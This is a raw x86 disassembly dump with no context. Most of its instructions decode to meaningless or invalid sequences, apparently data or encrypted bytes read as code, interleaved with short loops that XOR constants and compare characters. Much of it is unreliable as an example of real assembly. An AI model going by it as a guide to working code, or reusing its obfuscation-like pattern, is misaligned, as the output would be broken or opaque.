  4048de:	jmp    0x4bf5:0xa857fca3
  4048e5:	xchg   ecx,eax
  4048e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048e7:	lea    ebx,ds:0xb4023568
  4048ed:	add    ebp,edx
  4048ef:	(bad)  
  4048f0:	loopne 0x4048cf
  4048f2:	or     edi,0x14de53c6
  4048f8:	add    edx,DWORD PTR [ecx+esi*4]
  4048fb:	cs inc esp
  4048fd:	pop    edi
  4048fe:	loop   0x404902
  404900:	rol    DWORD PTR ds:[edi],cl
  404903:	fcmovnb st,st(5)
  404905:	outs   dx,BYTE PTR ds:[esi]
  404906:	aaa    
  404907:	and    al,0x62
  404909:	out    dx,al
  40490a:	cli    
  40490b:	into   
  40490c:	jmp    0xd5a:0x81cfcbd7
  404913:	dec    ecx
  404914:	arpl   WORD PTR [edi+ebp*8-0x4bff34f0],ax
  40491b:	sar    DWORD PTR [edi-0x1ff59f4],1
  404921:	xchg   esp,eax
  404922:	ds push ecx
  404924:	and    ecx,ebx
  404926:	fcmovnu st,st(5)
  404928:	ret    
  404929:	push   ebp
  40492a:	mov    edi,0xda639c53
  40492f:	add    BYTE PTR [eax+0x7baa3131],0x35
  404936:	dec    eax
  404937:	xor    BYTE PTR [edi],dh
  404939:	inc    eax
  40493a:	hlt    
  40493b:	jmp    0x3f59:0xcbf7a9bc
  404942:	mov    cl,0x76
  404944:	test   BYTE PTR [ebp+edi*2-0x17517960],0x72
  40494c:	mov    al,0xc3
  40494e:	dec    edx
  40494f:	jg     0x404942
  404951:	int3   
  404952:	call   0x6559:0x8df00cac
  404959:	call   0x717:0xb867f7fc
  404960:	fucomip st,st(2)
  404962:	mov    DWORD PTR [eax+0x4cda52ba],edi
  404968:	std    
  404969:	outs   dx,DWORD PTR ds:[esi]
  40496a:	inc    ecx
  40496b:	add    al,0xce
  40496d:	push   ss
  40496e:	rcr    esi,0xd7
  404971:	cmp    DWORD PTR [ebp+0xf679e07],edx
  404977:	adc    edx,DWORD PTR [ebp-0x5febbd01]
  40497d:	add    ah,bl
  40497f:	test   al,0xb3
  404981:	shl    DWORD PTR [ebp-0x2e],0x45
  404985:	(bad)  
  404986:	and    ah,ch
  404988:	jnp    0x404962
  40498a:	adc    eax,DWORD PTR ds:0xcfad5c19
  404990:	and    al,0xd5
  404992:	lds    esp,FWORD PTR [eax-0x7a]
  404995:	adc    DWORD PTR [ecx+ebp*1-0x107c291b],0x89fba4fc
  4049a0:	xor    esp,DWORD PTR [eax]
  4049a2:	or     DWORD PTR [ebx],esp
  4049a4:	sub    eax,0x7b60d80c
  4049a9:	xchg   esi,eax
  4049aa:	cmp    esp,edx
  4049ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049ad:	test   eax,0x3fa09733
  4049b2:	xor    esi,DWORD PTR [ebx+edi*8-0x38]
  4049b6:	push   esp
  4049b7:	push   edi
  4049b8:	xor    BYTE PTR [edi],bl
  4049ba:	in     al,0x8d
  4049bc:	gs push cs
  4049be:	sbb    al,0xca
  4049c0:	push   cs
  4049c1:	or     ebx,DWORD PTR [ebp+0x508b2bc8]
  4049c7:	or     eax,DWORD PTR [ebp-0x7c]
  4049ca:	das    
  4049cb:	imul   ebp,DWORD PTR [ebx],0x46
  4049ce:	jmp    0x7130:0x426fda6e
  4049d5:	xlat   BYTE PTR ds:[ebx]
  4049d6:	call   FWORD PTR [edx-0x62c4b83a]
  4049dc:	pop    ss
  4049dd:	mov    edi,0x7d8b5760
  4049e2:	or     BYTE PTR [ecx],bl
  4049e4:	sbb    eax,0x43369b
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x433633,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x4335d3
  404a04:	sbb    DWORD PTR ds:0x433673,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x4336a3,0x433673
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x4336b3,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx+0x7f]
  404a70:	xor    al,0xf2
  404a72:	test   BYTE PTR ss:0x7fab7c7c,ch
  404a79:	jl     0x404af7
  404a7b:	add    ecx,0xd6f5278c
  404a81:	push   0x15d62fac
  404a86:	repz (bad) 
  404a88:	xchg   esi,eax
  404a89:	adc    esp,DWORD PTR [edx]
  404a8b:	cmp    dl,bl
  404a8d:	push   esi
  404a8e:	lods   eax,DWORD PTR ds:[esi]
  404a8f:	add    al,0x71
  404a91:	pop    ebx
  404a92:	in     al,dx
  404a93:	jae    0x404ac4
  404a95:	adc    BYTE PTR [edx],bl
  404a97:	scas   al,BYTE PTR es:[edi]
  404a98:	in     al,0xc6
  404a9a:	push   esp
  404a9b:	mov    esp,0x1dea4794
  404aa0:	sbb    BYTE PTR [ebp+0x1f],dh
  404aa3:	mov    bl,0xd
  404aa5:	cmp    DWORD PTR [ebx],edi
  404aa7:	xchg   esi,eax
  404aa8:	outs   dx,DWORD PTR ds:[esi]
  404aa9:	mov    ah,BYTE PTR [ecx+0x3455830b]
  404aaf:	out    dx,eax
  404ab0:	jl     0x404a4c
  404ab2:	loope  0x404b04
  404ab4:	hlt    
  404ab5:	shl    BYTE PTR [eax],1
  404ab7:	lds    edi,FWORD PTR [ebp+0xe]
  404aba:	jo     0x404b19
  404abc:	adc    ch,BYTE PTR [ecx-0x1f01b40]
  404ac2:	adc    esi,edx
  404ac4:	nop
  404ac5:	push   ss
  404ac6:	xchg   esp,eax
  404ac7:	cmc    
  404ac8:	sub    al,0x51
  404aca:	(bad)  
  404acb:	js     0x404b0c
  404acd:	dec    ebx
  404ace:	sub    al,0x7d
  404ad0:	ds or  eax,0x8c1be750
  404ad6:	push   esp
  404ad7:	inc    ebx
  404ad8:	sub    edx,esp
  404ada:	sub    DWORD PTR [eax+0x13],ecx
  404add:	jmp    0x2102fb05
  404ae2:	out    0x37,eax
  404ae4:	lods   al,BYTE PTR ds:[esi]
  404ae5:	mov    edx,0x431bfe36
  404aea:	addr16 call 0xe916:0x78146d54
  404af2:	cwde   
  404af3:	into   
  404af4:	(bad)  
  404af5:	push   ds
  404af6:	pop    ss
  404af7:	enter  0x8857,0x6
  404afb:	sub    esp,DWORD PTR [ecx+0x2585ea81]
  404b01:	push   ds
  404b02:	popf   
  404b03:	stos   BYTE PTR es:[edi],al
  404b04:	sub    eax,0xdd56f23b
  404b09:	cmovge ebx,DWORD PTR [ecx+0x2cda320e]
  404b10:	(bad)  
  404b12:	push   es
  404b13:	jge    0x404ae9
  404b15:	mov    eax,0x2107740d
  404b1a:	inc    ecx
  404b1b:	dec    eax
  404b1c:	std    
  404b1d:	(bad)  
  404b1e:	shl    BYTE PTR [ebp-0x6d],1
  404b21:	mov    bl,bl
  404b23:	sbb    ebx,DWORD PTR [edi+esi*1]
  404b26:	pop    edi
  404b27:	xchg   DWORD PTR [esi+ebp*4],ecx
  404b2a:	aad    0xbc
  404b2c:	test   al,0x12
  404b2e:	stos   DWORD PTR es:[edi],eax
  404b2f:	jmp    0x404ae9
  404b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b32:	fild   QWORD PTR [eax+0x1f8e9d8a]
  404b38:	(bad)  
  404b39:	js     0x404b61
  404b3b:	fisub  DWORD PTR [ecx-0x62]
  404b3e:	lock inc esi
  404b40:	stos   DWORD PTR es:[edi],eax
  404b41:	and    bh,bh
  404b43:	in     al,dx
  404b44:	imul   ecx,DWORD PTR [esi+0xa4f89e3],0x13b07bf0
  404b4e:	adc    BYTE PTR [edx+ebx*1-0x4cf92255],ch
  404b55:	aam    0x10
  404b57:	mov    ?,WORD PTR [ecx]
  404b59:	adc    DWORD PTR [ecx-0x6a],eax
  404b5c:	jecxz  0x404af6
  404b5e:	ins    DWORD PTR es:[edi],dx
  404b5f:	jns    0x404b77
  404b61:	adc    al,0x8d
  404b63:	(bad)  
  404b64:	enter  0x360b,0x58
  404b68:	test   DWORD PTR [esi+0x2a],0x8dd9a634
  404b6f:	jmp    0x404b67
  404b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b72:	(bad)  
  404b73:	mov    al,ds:0x5aa8d37e
  404b78:	xchg   BYTE PTR [eax],cl
  404b7a:	(bad)  
  404b7b:	mov    cl,0x9d
  404b7d:	neg    DWORD PTR [ebx-0x6639e311]
  404b83:	out    dx,al
  404b84:	dec    ecx
  404b85:	dec    esp
  404b86:	adc    DWORD PTR [edi+0x22ff5708],0x1b9fe036
  404b90:	ret    
  404b91:	add    esp,DWORD PTR [ebx+0x2bcda76d]
  404b97:	scas   eax,DWORD PTR es:[edi]
  404b98:	xchg   esi,eax
  404b99:	lahf   
  404b9a:	repnz mov dl,0xb2
  404b9d:	add    BYTE PTR [eax+esi*2+0x18ac1da3],bh
  404ba4:	cwde   
  404ba5:	stos   BYTE PTR es:[edi],al
  404ba6:	cmp    al,bh
  404ba8:	push   es
  404ba9:	xchg   edx,eax
  404baa:	mov    esp,DWORD PTR [eax-0x75f85cd8]
  404bb0:	fbld   TBYTE PTR [esi-0x28f43869]
  404bb6:	aad    0xf1
  404bb8:	jbe    0x404b55
  404bba:	xchg   esi,eax
  404bbb:	pop    edx
  404bbc:	leave  
  404bbd:	jbe    0x404b60
  404bbf:	inc    ebx
  404bc0:	cld    
  404bc1:	dec    ebx
  404bc2:	cmp    DWORD PTR [eax+0x9],esi
  404bc5:	mov    edi,0x2927bd17
  404bca:	lds    ecx,FWORD PTR [eax+0x7f]
  404bcd:	test   dh,bl
  404bcf:	call   0x61842a62
  404bd4:	push   ds
  404bd5:	das    
  404bd6:	mov    bh,0xc5
  404bd8:	out    0x6e,al
  404bda:	mov    eax,0xfde5ad0f
  404bdf:	in     eax,dx
  404be0:	test   eax,0x17ec9a8d
  404be5:	loopne 0x404c0e
  404be7:	in     eax,dx
  404be8:	test   BYTE PTR [edx-0x58],ch
  404beb:	jne    0x404c67
  404bed:	pop    ds
  404bee:	data16 jmp 0x404be2
  404bf1:	mov    eax,ds:0x3007717f
  404bf6:	jmp    0x84dfbb8f
  404bfb:	dec    edi
  404bfc:	sbb    eax,0x63d7ba8f
  404c01:	test   BYTE PTR [ebp+0x49b636f7],dl
  404c07:	out    0xab,eax
  404c09:	lods   eax,DWORD PTR ds:[esi]
  404c0a:	sub    BYTE PTR [eax],ah
  404c0c:	dec    ecx
  404c0d:	jbe    0x404c4b
  404c0f:	push   ebp
  404c10:	jb     0x404c0b
  404c12:	mov    ecx,0x10daa1e6
  404c17:	ins    DWORD PTR es:[edi],dx
  404c18:	mov    ecx,0xf53ee279
  404c1d:	mov    esi,0x30825dc6
  404c22:	leave  
  404c23:	lods   eax,DWORD PTR ds:[esi]
  404c24:	cmp    al,0x5c
  404c26:	dec    ebp
  404c27:	sbb    eax,0x88e0e0c3
  404c2c:	sbb    ch,BYTE PTR [ecx+0x4b]
  404c2f:	fdiv   DWORD PTR [ebx]
  404c31:	rol    DWORD PTR [ebx],0xc6
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	jge    0x404ca6
  404c5f:	xchg   ebp,eax
  404c60:	sub    eax,0x7c7c2f33
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404c4d
  404c6a:	sti    
  404c6b:	jns    0x404c6d
  404c6d:	sar    DWORD PTR [esi],0xf3
  404c70:	pop    ebp
  404c71:	cs dec eax
  404c73:	out    dx,eax
  404c74:	xchg   ebp,eax
  404c75:	pop    ebx
  404c76:	outs   dx,DWORD PTR ds:[esi]
  404c77:	ss in  al,dx
  404c79:	gs pop ecx
  404c7b:	push   ebp
  404c7c:	xlat   BYTE PTR ds:[ebx]
  404c7d:	aam    0xef
  404c7f:	std    
  404c80:	nop
  404c81:	or     edx,DWORD PTR [edx+0x243976a0]
  404c87:	in     al,0x2a
  404c89:	cmp    al,0x6a
  404c8b:	or     bl,BYTE PTR [eax+eiz*4]
  404c8e:	ficom  DWORD PTR [edi+0x7a27f1e2]
  404c94:	xor    dl,BYTE PTR [esi+0x5b3d5ad5]
  404c9a:	add    ecx,DWORD PTR [ebx+0x45c6ac4a]
  404ca0:	mov    eax,0x25c668b6
  404ca5:	daa    
  404ca6:	out    0xc8,al
  404ca8:	leave  
  404ca9:	jne    0x404d1b
  404cab:	test   BYTE PTR [ecx-0x1298c8d4],ah
  404cb1:	jnp    0x404c5a
  404cb3:	xchg   BYTE PTR [edx-0x5354edeb],ah
  404cb9:	pop    ds
  404cba:	fst    QWORD PTR [esi+0x418cdf59]
  404cc0:	sbb    BYTE PTR [eax-0x4a],ah
  404cc3:	push   esi
  404cc4:	out    0xdf,eax
  404cc6:	fwait
  404cc7:	scas   eax,DWORD PTR es:[edi]
  404cc8:	xor    esi,DWORD PTR [ebx]
  404cca:	in     eax,0xfb
  404ccc:	mov    dh,0xfe
  404cce:	inc    esp
  404ccf:	mov    esp,0xbe3f20c7
  404cd4:	mov    esp,0xc97cd9ee
  404cd9:	pop    esi
  404cda:	in     eax,dx
  404cdb:	add    cl,BYTE PTR [ebx]
  404cdd:	jns    0x404cfd
  404cdf:	sahf   
  404ce0:	ins    DWORD PTR es:[edi],dx
  404ce1:	idiv   DWORD PTR [ecx-0x2e]
  404ce4:	fld    TBYTE PTR [ebx+0x5b]
  404ce7:	dec    edi
  404ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce9:	inc    ebx
  404cea:	and    DWORD PTR [esi+0x41],0x29
  404cee:	loop   0x404cb0
  404cf0:	and    DWORD PTR ds:0x900e8389,eax
  404cf6:	or     al,0x61
  404cf8:	pop    es
  404cf9:	push   cs
  404cfa:	sbb    eax,0xf9808f96
  404cff:	cmp    esp,DWORD PTR ds:0xb550b614
  404d05:	sub    eax,0x5c8e21b2
  404d0a:	outs   dx,DWORD PTR ds:[esi]
  404d0b:	fstp   QWORD PTR [edi-0x57]
  404d0e:	xor    esi,esp
  404d10:	inc    ebp
  404d11:	pop    ecx
  404d12:	rol    BYTE PTR [edx],1
  404d14:	xchg   ecx,eax
  404d15:	dec    esi
  404d16:	add    edi,DWORD PTR [bp-0x18]
  404d1a:	mov    ebx,0x7a757490
  404d1f:	sbb    ch,ch
  404d21:	mov    ds:0x280b1d89,eax
  404d26:	sub    ebx,DWORD PTR [ecx]
  404d28:	mov    BYTE PTR [eax-0x31],bl
  404d2b:	jo     0x404ce6
  404d2d:	ds pop ebx
  404d2f:	mov    bh,0xbe
  404d31:	cld    
  404d32:	ficomp WORD PTR ds:0xc1f92a5
  404d38:	adc    dl,BYTE PTR ds:0x171dfbfd
  404d3e:	xchg   ebp,eax
  404d3f:	inc    edx
  404d40:	mov    DWORD PTR [ecx],esp
  404d42:	pop    esi
  404d43:	mov    bh,0x7d
  404d45:	mov    ebp,ecx
  404d47:	rol    DWORD PTR [edx-0x21],cl
  404d4a:	lds    eax,FWORD PTR [edi+0x48]
  404d4d:	pushf  
  404d4e:	push   ds
  404d4f:	xchg   esp,eax
  404d50:	rcl    edi,cl
  404d52:	outs   dx,DWORD PTR ds:[esi]
  404d53:	in     eax,0x4f
  404d55:	nop
  404d56:	jb     0x404d8e
  404d58:	pusha  
  404d59:	and    BYTE PTR [ebx],bl
  404d5b:	ins    DWORD PTR es:[edi],dx
  404d5c:	cmp    eax,0xcc597357
  404d61:	push   eax
  404d62:	popa   
  404d63:	jae    0x404d3d
  404d65:	mov    eax,0x7df98e0
  404d6a:	icebp  
  404d6b:	mov    cl,0xfd
  404d6d:	cmp    DWORD PTR [ebx-0x58d844cb],esp
  404d73:	cmc    
  404d74:	outs   dx,BYTE PTR ds:[esi]
  404d75:	xchg   BYTE PTR [edi],al
  404d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d78:	cwde   
  404d79:	jmp    0x2c6774d1
  404d7e:	lods   eax,DWORD PTR ds:[esi]
  404d7f:	fisub  DWORD PTR [edx-0x57686ada]
  404d85:	mov    edi,0xb5412faf
  404d8a:	sub    eax,0x1d0f3908
  404d8f:	cli    
  404d90:	into   
  404d91:	pushf  
  404d92:	fmul   st,st(5)
  404d94:	sbb    al,0x40
  404d96:	repnz push esp
  404d98:	cmp    eax,0x6bd045f7
  404d9d:	lods   al,BYTE PTR ds:[esi]
  404d9e:	push   es
  404d9f:	sbb    bh,BYTE PTR [edx]
  404da1:	adc    al,0x37
  404da3:	xchg   ebx,eax
  404da4:	jne    0x404d77
  404da6:	pushf  
  404da7:	mov    fs,WORD PTR [ebp-0x1b07163a]
  404dad:	sbb    eax,0xa01e2dca
  404db2:	xor    eax,0xd5ca3b66
  404db7:	mov    ds:0xbcb7cd36,al
  404dbc:	mov    ah,cl
  404dbe:	ins    DWORD PTR es:[edi],dx
  404dbf:	jmp    0x76bd6f33
  404dc4:	push   ebx
  404dc5:	ss inc eax
  404dc7:	push   es
  404dc8:	push   ss
  404dc9:	cmc    
  404dca:	das    
  404dcb:	add    dh,BYTE PTR [edx]
  404dcd:	pop    ecx
  404dce:	test   DWORD PTR [esi+0x4e],0x22281e3c
  404dd5:	mov    ah,0xe6
  404dd7:	outs   dx,BYTE PTR ds:[esi]
  404dd8:	iret   
  404dd9:	iret   
  404dda:	cs mov ah,0xd0
  404ddd:	sbb    ah,BYTE PTR [ebx]
  404ddf:	and    DWORD PTR [edx-0x1f4a0300],0x1461e282
  404de9:	js     0x404e17
  404deb:	int    0xad
  404ded:	and    esi,0x571cb1ea
  404df3:	dec    edx
  404df4:	push   ebx
  404df5:	push   ds
  404df6:	sbb    eax,0xd3818f19
  404dfb:	aas    
  404dfc:	cmp    ebp,esp
  404dfe:	test   DWORD PTR [ebx+0x30496808],esp
  404e04:	es push ecx
  404e06:	xor    DWORD PTR [ebp-0x6afb02bb],edi
  404e0c:	clc    
  404e0d:	out    0x85,al
  404e0f:	or     edx,DWORD PTR [ebp+eax*2-0x769e1778]
  404e16:	pop    ecx
  404e17:	jecxz  0x404e52
  404e19:	xchg   esi,eax
  404e1a:	popf   
  404e1b:	pop    ss
  404e1c:	mul    BYTE PTR [edx]
  404e1e:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404e22:	mov    edx,DWORD PTR [ebp+0xc]
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0x37376490
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e49
  404e56:	pop    ss
  404e57:	jb     0x404eba
  404e59:	aam    0x86
  404e5b:	push   cs
  404e5c:	stos   DWORD PTR es:[edi],eax
  404e5d:	and    al,0x58
  404e5f:	jle    0x404e1d
  404e61:	push   ecx
  404e62:	dec    ebp
  404e63:	(bad)  
  404e64:	adc    ebx,DWORD PTR [edx]
  404e66:	adc    bh,dl
  404e68:	push   0xfffffffa
  404e6a:	inc    edi
  404e6b:	mov    ebx,0x19934102
  404e70:	pop    es
  404e71:	pop    ecx
  404e72:	mov    dh,bh
  404e74:	test   DWORD PTR [esi],esi
  404e76:	adc    dl,BYTE PTR [eax+eiz*2+0xc815260]
  404e7d:	imul   edi,DWORD PTR [ecx],0xff5ac7d5
  404e83:	pop    ss
  404e84:	jno    0x404e90
  404e86:	add    al,0x32
  404e88:	mov    esp,0xcb6d16d2
  404e8d:	ret    
  404e8e:	test   bl,ch
  404e90:	retf   
  404e91:	mov    ch,0x34
  404e93:	rcr    DWORD PTR [edx],1
  404e95:	mov    bh,0x0
  404e97:	mov    bl,0x5d
  404e99:	xchg   edx,eax
  404e9a:	(bad)  [eax]
  404e9c:	xor    eax,0x114ac10d
  404ea1:	cmp    eax,0x824bb65f
  404ea6:	sar    DWORD PTR [ebx-0x3e],1
  404ea9:	jo     0x404e93
  404eab:	push   eax
  404eac:	ret    0xdc4d
  404eaf:	mov    eax,ds:0x3992c868
  404eb4:	adc    esi,DWORD PTR [edi]
  404eb6:	xor    DWORD PTR [ebx],esp
  404eb8:	pop    edi
  404eb9:	push   ss
  404eba:	mov    dl,0x5a
  404ebc:	inc    ebp
  404ebd:	pop    edx
  404ebe:	imul   ebp,DWORD PTR ds:0xd528a024,0x6b33dba2
  404ec8:	fwait
  404ec9:	test   al,0x7e
  404ecb:	sbb    dl,BYTE PTR [edx]
  404ecd:	sub    DWORD PTR [ebx+ebx*2],ebp
  404ed0:	in     eax,dx
  404ed1:	int3   
  404ed2:	cdq    
  404ed3:	out    dx,al
  404ed4:	fld    QWORD PTR [ebp+0x55]
  404ed7:	arpl   WORD PTR [ecx-0x25],di
  404eda:	div    BYTE PTR [ebx+ecx*4]
  404edd:	fldenv [eax-0x51eafaaf]
  404ee3:	(bad)  [ecx-0x4f]
  404ee6:	mov    edx,0x4f91937e
  404eeb:	push   0xffffff9e
  404eed:	stos   DWORD PTR es:[edi],eax
  404eee:	or     dh,BYTE PTR [ecx+0x3f51315c]
  404ef4:	nop
  404ef5:	or     DWORD PTR [ebx+eiz*8+0x58],edx
  404ef9:	mov    esp,0xfde32590
  404efe:	pop    ebx
  404eff:	jbe    0x404ec3
  404f01:	fcom   DWORD PTR [ecx+ecx*8]
  404f04:	cmc    
  404f05:	sub    DWORD PTR [ebp+0x2bd3ab91],esi
  404f0b:	lahf   
  404f0c:	loope  0x404f5e
  404f0e:	mov    cl,BYTE PTR [eax+ecx*1-0x5f]
  404f12:	mov    dl,0xea
  404f14:	push   cs
  404f15:	add    eax,0x65c77bb7
  404f1a:	mov    al,0xa
  404f1c:	xor    edi,DWORD PTR [ebx+0x6b]
  404f1f:	sbb    BYTE PTR [esi+eax*1-0x31],0x7a
  404f24:	or     ebx,ebp
  404f26:	and    eax,0xb7c94e6c
  404f2b:	fnstenv [eax-0x49]
  404f2e:	sub    dl,ah
  404f30:	push   0x7dbedf73
  404f35:	das    
  404f36:	mov    ebp,0x51ebcbc6
  404f3b:	sub    eax,0xf9290d1f
  404f40:	(bad)  
  404f42:	fs clc 
  404f44:	or     BYTE PTR ds:0xf8ed57c0,al
  404f4a:	retf   
  404f4b:	mov    eax,0x7e513b38
  404f50:	rcl    DWORD PTR [ecx-0x47],0xc2
  404f54:	mov    cs,esp
  404f56:	sbb    DWORD PTR [ebp+0x700c628d],0xffffffda
  404f5d:	jns    0x404f0a
  404f5f:	cwde   
  404f60:	(bad)  
  404f61:	(bad)  
  404f62:	cmc    
  404f63:	or     ecx,esi
  404f65:	mov    cl,0x96
  404f67:	std    
  404f68:	lds    esi,FWORD PTR [esi]
  404f6a:	out    dx,eax
  404f6b:	adc    al,0xc4
  404f6d:	bound  edi,QWORD PTR [esi+edx*1]
  404f70:	lods   al,BYTE PTR ds:[esi]
  404f71:	xor    eax,esi
  404f73:	data16 in al,dx
  404f75:	ror    DWORD PTR [eax],0xe6
  404f78:	fiadd  DWORD PTR [ebx]
  404f7a:	fs or  al,0x50
  404f7d:	push   esi
  404f7e:	push   cs
  404f7f:	xchg   esi,eax
  404f80:	pop    esi
  404f81:	adc    BYTE PTR [edx-0x6a],0xb7
  404f85:	push   0x5a
  404f87:	rcr    DWORD PTR [esi],0x4c
  404f8a:	les    edx,FWORD PTR [edx]
  404f8c:	dec    esp
  404f8d:	jae    0x404f23
  404f8f:	cs dec ebx
  404f91:	mov    ebx,?
  404f93:	or     DWORD PTR [esi+0x742214ff],edx
  404f99:	mov    dh,0x51
  404f9b:	popa   
  404f9c:	lds    edx,FWORD PTR [ecx+0x58623ce4]
  404fa2:	and    eax,0xc1e4227b
  404fa7:	data16 ror BYTE PTR [edx],0x22
  404fab:	daa    
  404fac:	push   ss
  404fad:	dec    ebp
  404fae:	shl    ecx,1
  404fb0:	ret    0xb9fe
  404fb3:	xchg   edi,eax
  404fb4:	enter  0xe637,0x94
  404fb8:	mov    ecx,0x3c124e3c
  404fbd:	inc    ebx
  404fbe:	ror    DWORD PTR ds:0xd4e19c05,0x6
  404fc5:	fdiv   st,st(0)
  404fc7:	ror    DWORD PTR [ebx+edi*2],1
  404fca:	dec    ecx
  404fcb:	jle    0x404f8e
  404fcd:	fisubr WORD PTR [ecx+eiz*8]
  404fd0:	loopne 0x404fba
  404fd2:	sbb    bh,BYTE PTR [eax-0x2b]
  404fd5:	and    dl,BYTE PTR [ebp+0x697c1254]
  404fdb:	xchg   ebx,eax
  404fdc:	add    eax,esi
  404fde:	add    BYTE PTR [esi+0x480d6df9],ch
  404fe4:	or     ecx,0xffffffc1
  404fe7:	or     eax,0xd304e6de
  404fec:	aad    0x41
  404fee:	dec    eax
  404fef:	jb     0x404fab
  404ff1:	test   al,0xa7
  404ff3:	cmp    dl,BYTE PTR [ecx-0x4fe3545e]
  404ff9:	pop    ds
  404ffa:	push   edi
  404ffb:	daa    
  404ffc:	fwait
  404ffd:	adc    BYTE PTR [ebp-0xa020866],0x10
  405004:	fcmovb st,st(2)
  405006:	shl    BYTE PTR [ebx+eax*8+0x3bc603dc],1
  40500d:	ror    BYTE PTR [edi],1
  40500f:	test   BYTE PTR [edx],al
  405011:	add    al,BYTE PTR [eax]
  405013:	add    bh,al
  405015:	inc    ebp
  405016:	call   0x7464daa
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	xlat   BYTE PTR ds:[ebx]
  405044:	adc    al,0xac
  405046:	adc    esp,DWORD PTR [ebp-0x548383d8]
  40504c:	jg     0x4050ca
  40504e:	jl     0x405029
  405050:	test   ebx,edx
  405052:	jecxz  0x405049
  405054:	out    0x7e,eax
  405056:	out    dx,al
  405057:	nop
  405058:	scas   al,BYTE PTR es:[edi]
  405059:	push   esi
  40505a:	test   eax,0x44d99bcd
  40505f:	(bad)  
  405061:	or     DWORD PTR [edx],edi
  405063:	mov    ch,0x6a
  405065:	jp     0x40501a
  405067:	mov    cl,0x93
  405069:	xchg   edx,eax
  40506a:	add    eax,0xfadb144
  40506f:	jmp    0x405071
  405071:	mov    esi,0x75d39574
  405076:	ds cmc 
  405078:	pop    es
  405079:	ins    DWORD PTR es:[edi],dx
  40507a:	adc    al,0xfb
  40507c:	xchg   bl,al
  40507e:	push   ecx
  40507f:	jb     0x405034
  405081:	mov    esp,0xb76cd99c
  405086:	dec    esi
  405087:	nop
  405088:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40508a:	jno    0x40508a
  40508c:	fwait
  40508d:	ret    0x98c7
  405090:	and    eax,0x4bcc0cfe
  405095:	dec    eax
  405096:	fs jno 0x405049
  405099:	inc    ebp
  40509b:	gs mov eax,0x413e9790
  4050a1:	add    ch,al
  4050a3:	int    0xfe
  4050a5:	push   esi
  4050a6:	sbb    eax,0xcf14e73e
  4050ab:	lods   eax,DWORD PTR ds:[esi]
  4050ac:	cmp    bh,BYTE PTR [edx+eiz*4-0x34]
  4050b0:	mov    edx,0x34e7ff7b
  4050b5:	ja     0x405120
  4050b7:	bswap  esp
  4050b9:	mov    ebp,0xa0486f86
  4050be:	add    BYTE PTR [eax+edx*2],0xb0
  4050c2:	push   ecx
  4050c3:	mov    ds:0x9f1760c,eax
  4050c8:	dec    edi
  4050c9:	mov    BYTE PTR [eax],bh
